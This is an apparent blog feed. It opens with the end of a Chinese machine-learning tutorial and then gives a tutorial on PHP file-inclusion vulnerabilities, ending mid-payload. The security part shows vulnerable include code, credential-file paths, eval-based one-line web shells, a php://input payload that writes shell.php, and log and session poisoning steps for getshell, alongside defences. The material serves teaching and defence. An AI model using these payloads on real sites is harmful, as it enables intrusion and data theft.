class="number">80.1</span>, <span class="number">90.0</span>, <span class="number">83.2</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 实例化模型</span></span><br><span class="line">    estimator = LinearRegression()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 训练模型</span></span><br><span class="line">    estimator.fit(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印参数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;系数:&#x27;</span>, estimator.coef_)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;截距:&#x27;</span>, estimator.intercept_)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 新数据预测</span></span><br><span class="line">    mypred = estimator.predict([[<span class="number">90</span>,<span class="number">80</span>]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;预测成绩:&#x27;</span>, mypred[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 第二部分：模型保存与加载 ====</span></span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm02_Regression_save_load</span>():</span><br><span class="line">    <span class="comment"># 保存模型</span></span><br><span class="line">    estimator = LinearRegression()</span><br><span class="line">    joblib.dump(estimator, <span class="string">&#x27;/model/myrmlmodel01.bin&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加载模型</span></span><br><span class="line">    loaded_model = joblib.load(<span class="string">&#x27;/model/myrmlmodel01.bin&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用加载的模型预测</span></span><br><span class="line">    mypred2 = loaded_model.predict([[<span class="number">90</span>,<span class="number">80</span>]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加载模型预测成绩:&#x27;</span>, mypred2[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h4 id="分类问题"><a href="#分类问题" class="headerlink" title="分类问题"></a>分类问题</h4><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/%7B2C6CC2EC-9EE3-4927-8B89-35E72FECF96D%7D.png" alt="{2C6CC2EC-9EE3-4927-8B89-35E72FECF96D}"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm03_knn_chas</span>():</span><br><span class="line">    <span class="comment"># 数据准备</span></span><br><span class="line">    x = [</span><br><span class="line">        [<span class="number">39</span>, <span class="number">0</span>, <span class="number">31</span>],    <span class="comment"># 0-喜剧片</span></span><br><span class="line">        [<span class="number">3</span>, <span class="number">2</span>, <span class="number">65</span>],     <span class="comment"># 1-动作片</span></span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>, <span class="number">55</span>],     <span class="comment"># 2-爱情片</span></span><br><span class="line">        [<span class="number">9</span>, <span class="number">38</span>, <span class="number">2</span>],     <span class="comment"># 2-爱情片</span></span><br><span class="line">        [<span class="number">8</span>, <span class="number">34</span>, <span class="number">17</span>],    <span class="comment"># 2-爱情片</span></span><br><span class="line">        [<span class="number">5</span>, <span class="number">2</span>, <span class="number">57</span>],     <span class="comment"># 1-动作片</span></span><br><span class="line">        [<span class="number">21</span>, <span class="number">17</span>, <span class="number">5</span>],    <span class="comment"># 0-喜剧片</span></span><br><span class="line">        [<span class="number">45</span>, <span class="number">2</span>, <span class="number">9</span>]      <span class="comment"># 0-喜剧片（新增）</span></span><br><span class="line">    ]</span><br><span class="line">    y = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>]  </span><br><span class="line">       </span><br><span class="line">    estimator = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;模型参数：&#x27;</span>, estimator)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 训练模型</span></span><br><span class="line">    estimator.fit(x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 预测</span></span><br><span class="line">    mypre = estimator.predict([[<span class="number">23</span>, <span class="number">17</span>, <span class="number">5</span>]])  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;预测结果：&#x27;</span>, mypre)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 执行函数</span></span><br><span class="line">dm03_knn_chas()</span><br></pre></td></tr></table></figure><h4 id="聚类问题"><a href="#聚类问题" class="headerlink" title="聚类问题"></a>聚类问题</h4><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/%7BEB8BE956-A88E-4F60-AEB8-DD1AB830E688%7D.png" alt="{EB8BE956-A88E-4F60-AEB8-DD1AB830E688}"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.cluster <span class="keyword">import</span> KMeans</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt  </span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> calinski_harabasz_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm04_kmeans</span>():</span><br><span class="line">    <span class="comment"># 创建数据集</span></span><br><span class="line">    X, y = make_blobs(n_samples=<span class="number">1000</span>, n_features=<span class="number">2</span>, </span><br><span class="line">                     centers=[[<span class="number">1</span>, -<span class="number">1</span>], [<span class="number">0</span>,<span class="number">0</span>], [<span class="number">1</span>,<span class="number">1</span>], [<span class="number">2</span>,<span class="number">2</span>]], </span><br><span class="line">                     cluster_std=[<span class="number">0.4</span>, <span class="number">0.2</span>, <span class="number">0.2</span>, <span class="number">0.2</span>],  </span><br><span class="line">                     random_state=<span class="number">22</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 原始数据绘图</span></span><br><span class="line">    plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], marker=<span class="string">&#x27;o&#x27;</span>)  </span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不同聚类数实验</span></span><br><span class="line">    <span class="keyword">for</span> n_clusters <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]:  </span><br><span class="line">        <span class="comment"># 训练模型</span></span><br><span class="line">        model = KMeans(n_clusters=n_clusters, init=<span class="string">&#x27;k-means++&#x27;</span>, random_state=<span class="number">22</span>)</span><br><span class="line">        y_pred = model.fit_predict(X) </span><br><span class="line">       </span><br><span class="line">        <span class="comment"># 结果可视化</span></span><br><span class="line">        plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y_pred)</span><br><span class="line">        plt.show()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 模型评估</span></span><br><span class="line">        ch_score = calinski_harabasz_score(X, y_pred)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;n_clusters=<span class="subst">&#123;n_clusters&#125;</span> -&gt; CH值：<span class="subst">&#123;ch_score:<span class="number">.2</span>f&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行函数</span></span><br><span class="line">dm04_kmeans()</span><br></pre></td></tr></table></figure><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="特征工程-1"><a href="#特征工程-1" class="headerlink" title="特征工程"></a>特征工程</h3><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831101912582.png" alt="image-20230831101912582"></p><p>从数据集角度来看：    一列一列的数据为特征。</p><p>从模型训练角度来看： 对预测结果有用的属性为特征</p><p>特征工程是：利用专业背景知识和技巧处理数据，让机器学习算法<strong>效果最好</strong>。这个过程就是特征工程</p><p>释义：特征工程是困难、耗时、需要专业知识。应用机器学习基础就是特征工程                             </p><p><code>数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已</code></p><h3 id="特征提取-特征向量"><a href="#特征提取-特征向量" class="headerlink" title="特征提取(特征向量)"></a>特征提取(特征向量)</h3><p>从原始数据中提取与任务<strong>相关的</strong>特征，构成<strong>特征向量</strong></p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831103857938.png" alt="image-20230831103857938"></p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831104203971.png" alt="image-20230831104203971"></p><p>对于文本、图片这种非行列形式的数据行列形式转换，一旦转换成行列形式，一列就是特征</p><h3 id="特征预处理-影响一致性"><a href="#特征预处理-影响一致性" class="headerlink" title="特征预处理(影响一致性)"></a>特征预处理(影响一致性)</h3><p>特征对模型产生影响；因量纲问题，有些特征对模型影响大、有些影响小</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831103613657.png" alt="image-20230831103613657"></p><p>将不同的单位的特征数据转换成<strong>同一个范围</strong>内</p><p>使训练数据中<strong>不同特征</strong>对模型产生<strong>较为一致的影响</strong></p><h3 id="特征降维-保留主要"><a href="#特征降维-保留主要" class="headerlink" title="特征降维(保留主要)"></a>特征降维(保留主要)</h3><p>将原始数据的维度降低，叫做特征降维</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831105649036.png" alt="image-20230831105649036"></p><p>会<strong>丢失部分信息</strong>。降维就需要保证数据的<strong>主要信息要保留下来</strong></p><p>原始数据<strong>会发生变化</strong>，不需要了解数据本身是什么含义，它保留了最主要的信息</p><h3 id="特征选择-选择重要"><a href="#特征选择-选择重要" class="headerlink" title="特征选择(选择重要)"></a>特征选择(选择重要)</h3><p>原始数据特征很多，但是对<strong>任务相关</strong>是其中一个特征<strong>集合子集</strong>。</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20240723191521322.png" alt="image-20240723191521322"></p><p>从特征中选择出一些<strong>重要特征</strong>（选择就需要根据一些<strong>指标</strong>来选择）</p><p>特征选择<strong>不会改变</strong>原来的数据</p><h3 id="特征组合"><a href="#特征组合" class="headerlink" title="特征组合"></a>特征组合</h3><p>把多个的特征合并成一个特征。</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831112038043.png" alt="image-20230831112038043"></p><p>通过加法、乘法等方法将特征值合并</p><h2 id="模型拟合问题"><a href="#模型拟合问题" class="headerlink" title="模型拟合问题**"></a>模型拟合问题**</h2><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230831113029823.png" alt="image-20230831113029823"></p><p>拟合：用来表示模型对样本点的拟合情况</p><ul><li><p>欠拟合：模型在<strong>训练集</strong>上<strong>表现很差</strong>、在<strong>测试集</strong>表现也<strong>很差</strong></p><p>原因：模型<strong>过于简单</strong></p></li><li><p>过拟合：模型在<strong>训练集上表现很好</strong>、在<strong>测试集表现很差</strong></p><p>原因：模型<strong>太过于复杂</strong>、数据<strong>不纯</strong>、<strong>训练数据太少</strong></p></li></ul><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/%7B0A1C40C3-2A20-47EB-8FB5-FE92CD1B7A86%7D.png" alt="{0A1C40C3-2A20-47EB-8FB5-FE92CD1B7A86}"></p><ul><li><p>泛化：模型在<strong>新数据集</strong>（非训练数据）上的表现好坏的能力</p></li><li><p>奥卡姆剃刀原则：给定两个具有<strong>相同泛化误差</strong>的模型，<strong>较简单</strong>的模型比较复杂的模型<strong>更可取</strong></p></li></ul><p>(如无必要，勿增实体&#x2F;简单有效原理)</p><p><img src="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/image-20230909170335989.png" alt="image-20230909170335989"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h3 id="一、案例"><a href="#一、案例" class="headerlink" title="一、案例"></a>一、案例</h3><p><code>test.php</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件包含案例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;&lt;a href=<span class="string">&quot;test.php&quot;</span>&gt;Ryan&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;./test.php?file=about.php&quot;</span>&gt;About Me&lt;/a&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>about.php</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is about page!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I am Ryan.&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Thank you!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in flag.txt&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="二、文件包含漏洞"><a href="#二、文件包含漏洞" class="headerlink" title="二、文件包含漏洞"></a>二、文件包含漏洞</h3><h4 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1. 文件包含"></a>1. 文件包含</h4><p>文件包含：开发人员将可重复使用的内容写到单个文件中，使用时直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一，比如：导航栏、底部栏等。</p><h4 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2. 文件包含漏洞"></a>2. 文件包含漏洞</h4><p>文件包含漏洞：开发人员希望代码更加灵活，有时会将包含的文件设置为变量，用来动态调用，由于这种灵活性，可能导致攻击者调用恶意文件，造成文件包含漏洞。</p><h4 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3. 漏洞危害"></a>3. 漏洞危害</h4><ol><li>配合文件上传漏洞GetShell</li><li>网站源码文件以及配置文件泄露</li><li>远程包含GetShell</li><li>敏感信息泄露</li></ol><h4 id="4-文件包含相关函数"><a href="#4-文件包含相关函数" class="headerlink" title="4. 文件包含相关函数"></a>4. 文件包含相关函数</h4><p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web应用中居多，而在JSP、ASP程序中却非常少，甚至没有。PHP中提供了四个文件包含的函数，分别是<code>include()</code>、<code>include_once()</code>、<code>require()</code>和<code>require_once()</code>。它们的特点为：</p><ul><li><code>include</code>：出现错误时，会抛出一个警告，程序继续运行。</li><li><code>include_once</code>：出现错误时，会抛出警告，且仅包含一次。</li><li><code>require</code>：出现错误时，会直接报错并退出程序执行。</li><li><code>require_once</code>：出错时直接退出；且仅包含一次。</li></ul><p>PHP文件包含的特性：<br>只要被包含文件的文件内容符合PHP语法，不管文件类型是什么，该文件都会被php解释器去解析执行；如果文件内容不符合PHP语法，就会将该文件内容读取出来。</p><h4 id="5-漏洞利用思路"><a href="#5-漏洞利用思路" class="headerlink" title="5. 漏洞利用思路"></a>5. 漏洞利用思路</h4><ol><li>包含一些敏感的配置文件，获取目标敏感信息</li><li>配合图片马getshell</li><li>包含临时文件getshell</li><li>包含session文件getshell</li><li>包含日志文件getshell(Apache等)</li><li>利用php伪协议进行攻击</li></ol><h3 id="三、文件包含漏洞类型"><a href="#三、文件包含漏洞类型" class="headerlink" title="三、文件包含漏洞类型"></a>三、文件包含漏洞类型</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1. 本地文件包含"></a>1. 本地文件包含</h4><p>概念：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合网站的文件上传功能，从而形成更大的威力。简单来说：当包含的文件在服务器本地时，就形成了本地文件包含。</p><h5 id="（1）利用方式"><a href="#（1）利用方式" class="headerlink" title="（1）利用方式"></a>（1）利用方式</h5><ol><li>上传图片马，包含图片马GetShell</li><li>读取网站源码以及配置文件</li><li>包含日志文件GetShell</li></ol><h5 id="（2）读取敏感信息"><a href="#（2）读取敏感信息" class="headerlink" title="（2）读取敏感信息"></a>（2）读取敏感信息</h5><p>利用格式：<br>利用<code>file://</code>伪协议读取<br>Windows常见敏感文件：</p><ul><li><code>http://example.com/file.php?file=flag.txt</code></li><li><code>http://example.com/file.php?file=file://c:/windows/win.ini</code><table><thead><tr><th>文件</th><th>说明</th></tr></thead><tbody><tr><td><code>C:\boot.ini</code></td><td>查看系统版本</td></tr><tr><td><code>C:\windows\system32\inetsrv\MetaBase.xml</code></td><td>iis配置文件</td></tr><tr><td><code>C:\windows\repair\sam</code></td><td>存储windows系统初次安装密码</td></tr><tr><td><code>C:\ProgramFiles\mysql\my.ini</code></td><td>mysql配置信息</td></tr><tr><td><code>C:\ProgramFiles\mysql\data\mysql.user.MYD</code></td><td>mysql root密码</td></tr><tr><td><code>C:\windows\win.ini</code></td><td>系统信息，常用于注入木马</td></tr></tbody></table></li></ul><p>Linux常见敏感文件：</p><ul><li><code>/etc/passwd</code>|账户信息</li><li><code>/etc/shadow</code>|账户密码文件</li><li><code>/etc/apache2/apache2.conf</code>|Apache2默认配置文件</li><li><code>/etc/my.cnf</code>|mysql配置文件</li><li><code>/etc/php/5.6/apache2/php.ini</code>|php相关配置</li><li><code>/etc/httpd/conf/httpd.conf</code>|apache配置信息</li></ul><h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2. 远程文件包含"></a>2. 远程文件包含</h4><p>概念：如果应用程序的配置还允许包含远程的其它服务器上的文件，恶意攻击者就有可能构造恶意的脚本然后通过包含并予以执行，进而获取WEB应用的敏感数据或控制权，这种方式称为远程文件包含。简单来说：当包含的文件在远程服务器上时，就形成了远程文件包含。</p><p>利用前提：<code>allow_url_fopen=On</code>（默认开启）并且<code>allow_url_include=On</code>（默认关闭），可在<code>\phpstudy\PHPTutorial\php\php-5.2.17\php.ini</code>中配置。</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>攻击者在自己的服务器上随意写一个文件<code>phpinfo.php</code>，内容为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在目标网站上包含该文件。<br>远程文件包含一句话木马时，不要做成<code>.php</code>文件，一般做成<code>.txt</code>文件。因为本地php解释器和远程服务器的php解释器可能会造成冲突从而导致不解析。并且后缀为<code>.php</code>的文件，在包含时，显示的是远程服务器的信息，而不是本地的信息。如上方<code>phpinfo.php</code>显示的是远程服务器(kali)的php信息。<br>所以我们在远程服务器(kali)的<code>/var/www/html</code>目录下，创建一个名为<code>shell.txt</code>的文件，文件内容为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过远程文件包含来包含该文件（记得开启kali的apache服务）。</p><h3 id="四、PHP伪协议"><a href="#四、PHP伪协议" class="headerlink" title="四、PHP伪协议"></a>四、PHP伪协议</h3><p>PHP带有很多内置URL风格的封装协议，用于类似<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>和<code>filesize()</code>文件系统函数。具体协议请参照<a href="http://www.php.net/manual/zh/wrappers.php">PHP官方文档</a>。</p><h4 id="1-file"><a href="#1-file" class="headerlink" title="1. file:&#x2F;&#x2F;"></a>1. file:&#x2F;&#x2F;</h4><ul><li><strong>作用</strong>：用于访问本地文件系统，常用来读取本地文件。</li><li><strong>使用方法</strong>：<code>file://</code>文件的绝对路径和文件名。</li><li><strong>示例</strong>：<ul><li>绝对路径：<code>http://127.0.0.1/include.php?file=file://c:/windows/win.ini</code></li><li>相对路径：<code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></li></ul></li></ul><h4 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2. php:&#x2F;&#x2F;input"></a>2. php:&#x2F;&#x2F;input</h4><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行，如果存在文件包含漏洞，可将<code>php://input</code>作为文件名传入，同时在post中设置想要注入的代码，php执行时就会将post的内容作为php代码执行。</p><ul><li><strong>前提条件</strong>：<ul><li><code>allow_url_fopen</code>：off&#x2F;on</li><li><code>allow_url_include</code>：on</li></ul></li><li><strong>形式</strong>：<ul><li><code>php://input</code></li><li><code>post:php代码</code></li></ul></li><li><strong>示例</strong>：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-php-filter"><a href="#3-php-filter" class="headerlink" title="3. php:&#x2F;&#x2F;filter"></a>3. php:&#x2F;&#x2F;filter</h4><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤。主要用来查看源码。</p><ul><li><strong>用法</strong>：<code>php://filter/read=convert.base64_encode/resource=filepath</code>，表示以base64编码的方式进行读取指定路径的文件。</li><li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/03Web17/include/test.php?file=php://filter/read=convert.base64_encode/resource=about.php</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-phar"><a href="#4-phar" class="headerlink" title="4. phar:&#x2F;&#x2F;"></a>4. phar:&#x2F;&#x2F;</h4><ul><li><strong>作用</strong>：属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名，可修改为任意后缀，比如：<code>jpg</code>、<code>png</code>、<code>gif</code>等。</li><li><strong>使用方法</strong>：可以使用相对路径也可以使用绝对路径。</li><li><strong>示例</strong>：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phar:<span class="comment">//./phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="5-zip"><a href="#5-zip" class="headerlink" title="5. zip:&#x2F;&#x2F;"></a>5. zip:&#x2F;&#x2F;</h4><ul><li><strong>作用</strong>：属于压缩流，可以访问压缩文件中的子文件，可以不需要指定后缀名，可修改为任意后缀。比如：<code>jpg</code>、<code>png</code>、<code>gif</code>等。</li><li><strong>优缺点</strong>：<ul><li><strong>优点</strong>：可以绕过包含的固定后缀。</li><li><strong>缺点</strong>：需要知道文件的绝对路径。</li></ul></li><li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line">http://127.0.0.1/03Web17/include/test.php?file=phar://./phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="6-http-https"><a href="#6-http-https" class="headerlink" title="6. http:&#x2F;&#x2F; https:&#x2F;&#x2F;"></a>6. http:&#x2F;&#x2F; https:&#x2F;&#x2F;</h4><ul><li><strong>作用</strong>：访问远程文件或资源，常用于远程包含。</li><li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/03Web17/include/test.php?file=zip://D:/phpStudy/PHPTutorial/WWW/03Web17/include/phpinfo.jpg%23phpinfo.txt</span><br><span class="line">allow_url_fopen：on</span><br><span class="line">allow_url_include: on</span><br><span class="line">http://127.0.0.1/03Web17/include/test.php?file=http://baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="7-data"><a href="#7-data" class="headerlink" title="7. data:&#x2F;&#x2F;"></a>7. data:&#x2F;&#x2F;</h4><ul><li><strong>作用</strong>：数据流封装器，以传递相应格式的数据。</li><li><strong>使用条件</strong>：<ul><li><code>allow_url_fopen</code>：on</li><li><code>allow_url_include</code>：on</li></ul></li><li><strong>用法</strong>：<ul><li><code>data://text/plain,[php代码]</code></li><li><code>data://text/plain;base64,[base64编码的php代码]</code></li></ul></li><li><strong>示例</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure></li></ul><h3 id="五、防御方案"><a href="#五、防御方案" class="headerlink" title="五、防御方案"></a>五、防御方案</h3><ol><li><strong>设置白名单</strong>：代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。</li><li><strong>路径限制</strong>：限制被包含的文件只能在某一文件夹内，PHP配置文件中有<code>open_basedir</code>选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</li><li><strong>关闭危险配置</strong>：PHP配置中的<code>allow_url_include</code>选项如果打开，PHP会通过Include&#x2F;Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</li><li><strong>过滤危险字符</strong>：严格检查用户输入，参数中不允许出现<code>../</code>之类的目录跳转符。</li><li><strong>尽量不要使用动态包含</strong>：可以在需要包含的页面固定写好，如：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head.php&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol><h3 id="六、包含Apache日志文件-getshell"><a href="#六、包含Apache日志文件-getshell" class="headerlink" title="六、包含Apache日志文件 getshell"></a>六、包含Apache日志文件 getshell</h3><ul><li><strong>开启Apache日志文件</strong><ul><li>一般apache会存在两个日志文件：<ol><li>访问日志文件（<code>access.log</code>）访问日志默认是不开启</li><li>错误日志文件（<code>error.log</code>）</li></ol></li><li>apache开启了日志功能时，会主动记录外部访问到<code>access.log</code></li></ul></li><li><strong>访问网站</strong>：在网址中输入一句话木马<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></li><li><strong>查看<code>access.log</code>文件</strong>：发现部分内容被转义了</li><li><strong>使用burp发包</strong></li><li><strong>再次查看<code>access.log</code>文件</strong>：发现一句话木马正常存在</li><li><strong>包含<code>access.log</code>文件getshell</strong></li></ul><h3 id="七、phpmyadmin-文件包含"><a href="#七、phpmyadmin-文件包含" class="headerlink" title="七、phpmyadmin 文件包含"></a>七、phpmyadmin 文件包含</h3><h3 id="1-利用-session-文件-getshell"><a href="#1-利用-session-文件-getshell" class="headerlink" title="1. 利用 session 文件 getshell"></a>1. 利用 session 文件 getshell</h3><ol><li><strong>执行sql语句</strong>：查看session，主要看cookie中<code>phpmyadmin</code>中的值</li><li><strong>在<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>中，搜索这个值</strong>，打开文件后发现文件中有<code>&lt;?php eval($_GET[&#39;S&#39;]);?&gt;</code></li><li><strong>利用本地文件包含去包含<code>\tmp\tmp\sess_tl5epcif7ahh0vbb7j59nvi0ppab23a0</code>文件即可RCE，playload如下（要根据自己目录选择跳跃几级，我的是四级目录），可以看到RCE执行成功</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span 